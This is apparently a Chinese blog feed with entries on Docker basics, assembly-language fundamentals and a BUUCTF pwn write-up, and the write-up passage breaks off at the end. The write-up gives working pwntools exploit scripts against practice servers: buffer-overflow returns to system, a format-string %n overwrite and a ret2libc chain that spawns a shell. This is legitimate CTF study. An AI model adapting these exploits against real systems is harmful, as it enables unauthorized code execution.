    <content type="html"><![CDATA[<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><h2 id="出现背景"><a href="#出现背景" class="headerlink" title="出现背景"></a>出现背景</h2><p>将环境与项目一起安装打包，避免部署环境的繁杂工作</p><p>及跨平台问题</p><p>Java — apk — 发布（应用商店） — 使用apk — 安装即可用</p><p>java — jar(环境) — 打包项目带上环境（镜像）— (Docker仓库：商店) — 下载发布的镜像 — 直接运行</p><h2 id="开发思想"><a href="#开发思想" class="headerlink" title="开发思想"></a>开发思想</h2><p>集装箱（&#x3D;&#x3D;互相隔离&#x3D;&#x3D;的项目）</p><p>jar — 多个应用（端口冲突）— 交叉并行</p><p>Docker利用隔离机制，将服务器利用到极致</p><h2 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h2><p>pass云计算服务+LXC容器技术 — Docker（容器化技术&#x3D;&#x3D;也是虚拟化技术！&#x3D;&#x3D;）</p><p>比虚拟机轻巧，方便，启动速度快，占用内存小（但完整）</p><p>区别：</p><blockquote><p>vm:linux centos 原生镜像互相隔离，需要开启多个虚拟机</p><p>docker : 隔离，镜像（4m+jdk+mysql）小巧，运行镜像就可以，几M，秒级启动 </p></blockquote><h2 id="关于Docker"><a href="#关于Docker" class="headerlink" title="关于Docker"></a>关于Docker</h2><p>&#x3D;&#x3D;基于Go语言开发&#x3D;&#x3D;</p><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>帮助文档：<a href="https://docs.docker.com/">https://docs.docker.com/</a>很详细</p><p>仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a>与git类似</p><h2 id="隔离机制"><a href="#隔离机制" class="headerlink" title="隔离机制"></a>隔离机制</h2><p><img src="/../images/Docker/image-20230726232454445.png" alt="image-20230726232454445"></p><p>​虚拟机（内核+操作环境+APP）</p><blockquote><ul><li>资源占用大</li><li>启动步骤冗余，慢！</li></ul></blockquote><p><img src="/../images/Docker/image-20230726232923656.png"></p><p>​Docker（内核+镜像） </p><blockquote><ul><li>容器化技术（&#x3D;&#x3D;不是完整的操作系统&#x3D;&#x3D;）</li><li>容器内的应用直接运行在宿主机的内容，容器没有自己的内核，也没有虚拟硬件，所以轻便</li></ul></blockquote><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>更快速的交付和部署</p><p>更便捷的升级和扩缩容（镜像一键运行）</p><p>更简单的系统运维</p><p>更高效的资源利用（内核级别的虚拟化）</p><h2 id="基本组成"><a href="#基本组成" class="headerlink" title="基本组成"></a>基本组成</h2><p><img src="/../images/Docker/image-20230728124422847.png" alt="image-20230728124422847"></p><p><strong>Client（客户端）</strong></p><blockquote><p>docker build创建</p><p>docker pull选取</p><p>docker run运行</p></blockquote><p><strong>DOCKER_HOST(服务器）</strong></p><blockquote><p>Images（镜像）&#x3D;&#x3D;类似于C++中的类&#x3D;&#x3D;（用于创建容器服务）</p><p>Containers（容器）&#x3D;&#x3D;类似于C++中类创建的对象&#x3D;&#x3D;（负责运行具体项目）</p></blockquote><p>**Registry（仓库） **</p><p>存放镜像的地方</p><p>分公有和私有</p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一、基础知识</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-汇编语言简介"><a href="#1-汇编语言简介" class="headerlink" title="1. 汇编语言简介"></a>1. 汇编语言简介</h2><p><em><strong>从机器语言到汇编语言：</strong></em></p><p><strong>机器语言</strong>：由“0”“1”数字编成，以二进制为基础表示电子器件的高低电平，从而执行机器指令，进行运算。</p><p>明显弊端：难以书写和阅读，复杂难懂。</p><p>于是，程序员写出了编译器来翻译机器语言，汇编语言诞生了。</p><p><strong>汇编语言</strong>：主体为汇编指令。如“mov ax,bx”。操作对象为CPU、寄存器和内存。</p><h2 id="2-CPU基本工作原理"><a href="#2-CPU基本工作原理" class="headerlink" title="2. CPU基本工作原理"></a>2. CPU基本工作原理</h2><blockquote><p>CPU 是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据。指令和数据在存储器中存放，也就是我们平时所说的内存。 </p></blockquote><h3 id="2-1-存储单元、指令和数据"><a href="#2-1-存储单元、指令和数据" class="headerlink" title="2.1 存储单元、指令和数据"></a>2.1 存储单元、指令和数据</h3><p><strong>指令和数据：</strong></p><blockquote><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。<strong>CPU 在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。</strong>（）</p></blockquote><p><strong>存储单元：</strong></p><blockquote><p>存储器被划分成若干个存储单元，每个存储单元从0开始顺序编号。一个存储器能存储128个Byte。</p></blockquote><p>内存计量单位：<br>8bit&#x3D;1B   1KB&#x3D;1024B   1MB&#x3D;1024KB            1GB&#x3D;1024MB   1TB&#x3D;1024GB</p><h3 id="2-2-CPU对存储器的读写"><a href="#2-2-CPU对存储器的读写" class="headerlink" title="2.2 CPU对存储器的读写"></a>2.2 CPU对存储器的读写</h3><blockquote><p>存储器被划分成多个存储单元，存储单元从零开始顺序编号。这些编号可以看作存储单元在存储器中的<strong>地址</strong>。<br>CPU 要从内存中读数据，<strong>首先要指定存储单元的地址</strong><br>CPU 在读写数据时还要指明，它要对哪一个器件进行操作，进行哪种操作，是从中读出数据，还是向里面写入数据。</p></blockquote><p>可见，CPU想进行数据的读写需要和外部器件进行以下三类信息交互：</p><ul><li>存储单元的地址(<strong>地址信息</strong>);</li><li>器件的选择，读或写的命令(<strong>控制信息</strong>); </li><li>读或写的数据(<strong>数据信息</strong>)。</li></ul><h3 id="2-3-三大总线"><a href="#2-3-三大总线" class="headerlink" title="2.3 三大总线"></a>2.3 三大总线</h3><p>CPU通过导线将电信号传到存储器芯片中，从而实现信息的交互。</p><blockquote><p>在计算机中专门有连接 CPU 和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。 根据传送信息的不同，总线从逻辑上又分为3类，<strong>地址总线、控制总线和数据总线</strong>。<br>示例：<br><img src="/.com//%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6e940afe0acd49fb81f16f36f82aea32.png"><br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。<br>(3) 存储器将3号单元中的数据8通过数据线送入CPU。<br>写操作与读操作的步骤相似。如向3号单元写入数据26:<br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存写命令，选中存储器芯片，并通知它，要向其中写入数据。<br>(3) CPU通过数据线將数据26送入内存的3号单元中。</p></blockquote><p>要让一个计算机或微处理器工作，应向它输入能够驱动它进行工作的电平信息(机器码)。CPU 按收这条机器码后将完成我们上面所述的读写工作。 机器码难于记忆，用汇编指令来表示，情况如下。<br>机器码: 10100001 00000011 00000000<br>对应的汇编指令:MOV AX,[3]<br>含义: 传送3号单元的内容入AX</p><p><strong>由此可见，汇编指令可以方便地直接对CPU进行操作。</strong></p><blockquote><p><strong>地址总线：</strong> CPU是通过地址总线来指定存储器单元的，地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。<br>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N。这样的CPU可以寻找2ⁿ个内存单元。</p></blockquote><blockquote><p><strong>数据总线：</strong> CPU与内存或其他器件之间的数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。<br>8根数据总线一次可传送一个8位二进制数据(即一个字节)。16根数据总线一次可传送两个字节。</p></blockquote><blockquote><p><strong>控制总线：</strong> CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着 CPU 提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU 对外部器件的控制能力。</p></blockquote><ul><li>地址总线的宽度决定了CPU 的寻址能力;</li><li>数据总线的宽度决定了CPU 与其他器件进行数据传送时的一次数据传送量: </li><li>控制总线的宽度决定了CPU 对系统中其他器件的控制能力。</li></ul><h2 id="3-内存地址空间"><a href="#3-内存地址空间" class="headerlink" title="3. 内存地址空间"></a>3. 内存地址空间</h2><p>CPU在操控存储器的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是我们所说的内存地址空间。</p><p><img src="/.com//%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fa1df46f566545759f03dc1f1d22a794-16907081340422.png" alt="逻辑存储器"><br>在图1. 8中，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。</p><blockquote><p>内存地址空间的大小受CPU地址总线宽度的限制。8086CPU的地址总线宽度为20，可以传送2²⁰个不同的地址信息(大小从0至2²⁰−1)。即可定位2²⁰个内存单元，则8086PC的内存地址空间大小为1MB。同理，80386CPU的地址总线宽度为32，则内存地址空间最大为4GB。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF（1~10）</title>
    <link href="/2023/07/30/BUUCTF/1~10/"/>
    <url>/2023/07/30/BUUCTF/1~10/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF（1-10题）"><a href="#BUUCTF（1-10题）" class="headerlink" title="BUUCTF（1~10题）"></a>BUUCTF（1~10题）</h1><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>运行，直接利用system函数“cat flag”即可。</p><h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230405162937267.png" alt="2.1"></p><p>发现gets危险输入</p><p><img src="/.com//1~10/image-20230405163225751.png" alt="2.2"></p><p>看到fun函数调用了“system”，找到fun的地址 0x401186</p><p>则利用gets溢出返回到fun函数地址即可</p><h3 id="2-Payload"><a href="#2-Payload" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = remote(&quot;node4.buuoj.cn&quot;,28996)<br><br>system_addr = 0x401186<br>sh.sendline(b&#x27;A&#x27;*15+b&#x27;a&#x27;*8 + p64(system_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><strong>PS</strong>：有时栈的大小未知，需要利用GDB调试出偏移地址的大小。</p><h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h2><h3 id="1-解题思路-1"><a href="#1-解题思路-1" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230405164743647.png" alt="3.1"></p><p>发现flag提示</p><p><img src="/.com//1~10/image-20230405164659197.png" alt="3.2"></p><p>找到调用system的函数地址：0x400611</p><p><img src="/.com//1~10/image-20230405165018347.png" alt="3.3"></p><p><img src="/.com//1~10/image-20230405170440308.png" alt="3.4"></p><h3 id="2-GDB调试找偏移地址"><a href="#2-GDB调试找偏移地址" class="headerlink" title="(2)GDB调试找偏移地址"></a>(2)<em>GDB调试找偏移地址</em></h3><p>1.打断点</p><p><img src="/.com//1~10/image-20230405175926725.png" alt="point1"></p><p>2.先 r 一下</p><p><strong>3.利用cyclic函数生成构造的字符串队列，作为程序的输入。</strong></p><img src="/.com//1~10/image-20230405181049487.png" alt="point2"><p><strong>4.利用”cyclic -l 中断字符串“计算得出偏移：</strong></p><p><img src="/.com//1~10/image-20230405181318593.png" alt="point3"></p><p><strong>PS</strong>：由于char构造的字符数组在实际分配内存时会多占用一个字节的内存。多出来的一个字节用来存储”\0”用来表示字符串的结束。</p><p>故所得偏移地址为64字节，即0x40为栈的大小。</p><h3 id="3-Payload"><a href="#3-Payload" class="headerlink" title="(3)Payload"></a>(3)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>sh = remote(&#x27;node4.buuoj.cn&#x27;,29352)<br>payload=B&#x27;a&#x27;*(0x40+8)+p64(0x400611)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h2><h3 id="1-解题思路-2"><a href="#1-解题思路-2" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230406192357497.png" alt="4.1"></p><p>进入fun( )函数中</p><p><img src="/.com//1~10/image-20230406192445828.png" alt="4.2"></p><p><strong>发现需要利用gets函数溢出到v2的地址，并修改v2的值为11.28125，从而返回system函数拿到flag。</strong></p><p>找到v2和v1的地址</p><p> <img src="/.com//1~10/image-20230406193412024.png" alt="4.3"></p><p>偏移地址&#x3D;0x30-0x04&#x3D;0x2c</p><p>11.28125&#x3D;0x41348000</p><h3 id="2-Payload-1"><a href="#2-Payload-1" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,26573)<br>payload=B&#x27;a&#x27;*0x2c+p64(0x41348000)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h2><h3 id="1-解题思路-3"><a href="#1-解题思路-3" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230405113611488.png" alt="5.1"></p><p>发现只有一个“vuln()”函数，点进去</p><p><img src="/.com//1~10/image-20230405113743751.png" alt="5.2"></p><p>在网上搜索大佬的解释，发现fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，但是这个程序有点意思的地方就在于<strong>会将一个字节的“I”替换成三个字节的“you”</strong><br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用！</p><p><img src="/.com//1~10/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70.png" alt="5.2"></p><p>然后用 <kbd>Shift</kbd>+<kbd>F12</kbd> 来查看程序里的字符串</p><p><img src="/.com//1~10/image-20230405114511713.png" alt="5.3"></p><p>发现有明显的flag提示</p><p>找到调用“system”函数的地址</p><p><img src="/.com//1~10/image-20230405142650865.png" alt="5.4"></p><p><img src="/.com//1~10/image-20230405145102227.png" alt="5.5"></p><h3 id="2-Payload-2"><a href="#2-Payload-2" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br>r=remote(&quot;node4.buuoj.cn&quot;,26622)<br>flag_addr=0x8048F0D<br>payload=B&#x27;I&#x27;*20+B&#x27;a&#x27;*4+p32(flag_addr)<br><br>r.sendline(payload)<br><br>r.interactive() <br></code></pre></td></tr></table></figure><h2 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h2><h3 id="1-解题思路-4"><a href="#1-解题思路-4" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230406203902084.png" alt="image-20230406203902084"></p><p><img src="/.com//1~10/image-20230406203930751.png" alt="image-20230406203930751"></p><p><strong>可以利用read函数制造栈溢出。</strong></p><p>在函数列表中发现调用system函数的提示</p><p><img src="/.com//1~10/image-20230406204054142.png" alt="image-20230406204054142"></p><p>果然</p><p><img src="/.com//1~10/image-20230406203837624.png" alt="image-20230406203837624"></p><p>记录该函数地址：0x400596</p><p>GDB调试出偏移地址为136字节，即0x88为栈的大小。</p><h3 id="2-Payload-3"><a href="#2-Payload-3" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,29850)<br>payload=B&#x27;a&#x27;*0x88+p64(0x400596)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-第五空间2019-决赛-PWN5-Canary绕过"><a href="#7-第五空间2019-决赛-PWN5-Canary绕过" class="headerlink" title="7.[第五空间2019 决赛]PWN5 (Canary绕过)"></a>7.[第五空间2019 决赛]PWN5 (Canary绕过)</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h3><p><img src="/.com//1~10/image-20230406212118370.png"></p><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230406210826989.png" alt="image-20230406210826989"></p><p>根据网上的解释，函数的功能是读入一个4位的随机密码，再将我们输入的密码与随机生成数比较，相同就执行system。</p><p>这里面的printf（）存在<strong>格式化字符串漏洞</strong></p><h3 id="printf（）格式化字符串漏洞"><a href="#printf（）格式化字符串漏洞" class="headerlink" title="printf（）格式化字符串漏洞"></a>printf（）格式化字符串漏洞</h3><p><img src="/.com//1~10/image-20230409172725613.png" alt="image-20230409172725613"></p><p><img src="/.com//1~10/image-20230409172805370.png" alt="image-20230409172805370"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用 “AAAA %08x %08x %8x %08x %08x %08x %08x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，即首地址偏移或者偏移量</p><p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p><p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据</p><p>首先我们要定位到我们输入的字符串在栈上的位置。</p><p>我们输入的参数是在栈上的第10个，后面可以直接利用 %10$ 定位到这个位置。<br>随机生成函数的位置是0x804c044开始的，长度为4字节,依次+1即可。</p><p>所以可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这这个地址里的内容</p><h3 id="绕过Canary保护机制"><a href="#绕过Canary保护机制" class="headerlink" title="绕过Canary保护机制"></a>绕过Canary保护机制</h3><p>先用GDB运行一下</p><p><img src="/.com//1~10/image-20230409173022608.png" alt="image-20230409173022608"></p><p>发现”AAAA“的ASCII编码“41414141”离首字节有10个字符串，故输入的字符定位在函数栈上的第10个位置，后面可以直接利用 %10$ 定位到这个位置。</p><p><img src="/.com//1~10/image-20230409180312194.png" alt="image-20230409180312194"></p><p>从主函数中能看到随机生成函数的位置是0x804C044开始的，长度为4字节,依次+1即可。</p><p>所以可以用<code>%10$,%11$,%12$,%13$</code>去定位到这4个地址，再用%n修改这这个地址里的内容，因此构造payload</p><h3 id="2-Payload-4"><a href="#2-Payload-4" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>c = remote(&quot;node4.buuoj.cn&quot;,28635)<br><br>payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)<br>payload+=B&#x27;%10$n%11$n%12$n%13$n&#x27;<br><br>c.sendline(payload)<br>c.sendline(str(0x10101010))<br>c.interactive()<br></code></pre></td></tr></table></figure><p><strong>payload分析：</strong></p><blockquote><ol><li><p><code>payload = p32(0x804c044) + p32(0x804c045) + p32(0x804c046) + p32(0x804c047)</code>：构造一个字符串，其中包含4个32位整数，分别是<code>0x804c044</code>、<code>0x804c045</code>、<code>0x804c046</code>和<code>0x804c047</code>。这些整数是用于指定格式化字符串漏洞中待写入的地址。</p></li><li><p><code>payload += b&#39;%10$n%11$n%12$n%13$n&#39;</code>：在已构造的字符串后追加一个格式化字符串，其中使用了格式化字符串的特殊格式<code>%n</code>。<code>%n</code>的作用是将前面的字符数（即已输出的字符数）写入到对应的地址中。具体来说，<code>%10$n</code>表示将已输出的字符数写入到第10个参数所指向的地址中，<code>%11$n</code>表示将已输出的字符数写入到第11个参数所指向的地址中，以此类推。</p></li></ol><p>利用格式化字符串漏洞，将已输出的字符数写入到指定的地址中。通过在payload中指定不同的地址，可以将相应的值写入到这些地址中。根据payload中的内容，第10个参数的地址将被写入<code>0x804c044</code>，第11个参数的地址将被写入<code>0x804c045</code>，以此类推。这样，当程序执行到这个payload时，它会将已输出的字符数写入到指定的地址中，实现对这些地址的写入操作从而覆盖原有的canary保护。</p></blockquote><p><img src="/.com//1~10/image-20230409181837890.png" alt="image-20230409181837890"></p><h2 id="8-ciscn-2019-c-1-libc泄露地址"><a href="#8-ciscn-2019-c-1-libc泄露地址" class="headerlink" title="8.ciscn_2019_c_1 (libc泄露地址)"></a>8.ciscn_2019_c_1 (libc泄露地址)</h2><h3 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h3><p>例行检查</p><p><img src="/.com//1~10/image-20230414204605444.png" alt="image-20230414204605444"></p><p>开启了栈不可执行，因此shellcode方法失效</p><p>用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/.com//1~10/image-20230414202914812.png" alt="image-20230414202914812"></p><p>尝试先在GDB中运行一下，发现这是一个输入1&#x2F;2&#x2F;3来进入以下三个函数的程序</p><p><img src="/.com//1~10/image-20230414204819897.png" alt="image-20230414204819897"></p><p>进入这三个函数查看，在encrypt函数中发现gets，因此估计是一道ret2libc的题目，由于这是64位程序，寻找”pop、rdi、ret“就行</p><p><img src="/.com//1~10/image-20230530180246796.png" alt="image-20230530180246796"></p><p>使用ROPgadget寻找</p><p><img src="/.com//1~10/image-20230530174718768.png" alt="image-20230530174718768"></p><h3 id="2-Payload-5"><a href="#2-Payload-5" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&quot;./ciscn_2019_c_1&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25096</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>encrypt_addr = elf.symbols[<span class="hljs-string">&quot;encrypt&quot;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>,payload)<br>io.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br>puts_addr = u64(io.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(ret) +p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>脚本分析：</p><blockquote><ol start="4"><li><p><code>elf = ELF(&quot;./ciscn_2019_c_1&quot;)</code>：加载二进制文件<code>ciscn_2019_c_1</code>，并创建一个ELF对象，用于获取二进制文件中的符号信息。</p></li><li><p><code>puts_plt = elf.plt[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的PLT地址。</p></li><li><p><code>puts_got = elf.got[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的GOT地址。</p></li><li><p><code>pop_rdi_ret = 0x400c83</code>：设置<code>pop rdi; ret</code>指令序列的地址，该指令用于将参数加载到RDI寄存器中。</p></li><li><p><code>ret = 0x4006b9</code>：设置<code>ret</code>指令的地址，该指令用于返回函数调用。</p></li><li><p><code>encrypt_addr = elf.symbols[&quot;encrypt&quot;]</code>：从ELF对象中获取<code>encrypt</code>函数的地址。</p></li><li><p><code>main_addr = elf.symbols[&#39;main&#39;]</code>：从ELF对象中获取<code>main</code>函数的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</code>：构造payload用于触发漏洞。payload包括一些填充数据（<code>b&#39;a&#39; * (0x50 + 0x08)</code>）和ROP链。ROP链的作用是构造栈上的一系列指令序列，以实现漏洞利用的目的。具体来说，这个ROP链的作用是调用<code>puts(puts_got)</code>，将<code>puts</code>函数的真实地址泄露出来，以便后续计算libc基址。</p></li><li><p><code>io.sendlineafter(&quot;Input your choice!\n&quot;,str(1))</code>：发送字符串”1”给远程服务，用于选择相应的功能。</p></li><li><p><code>io.sendlineafter(&quot;Input your Plaintext to be 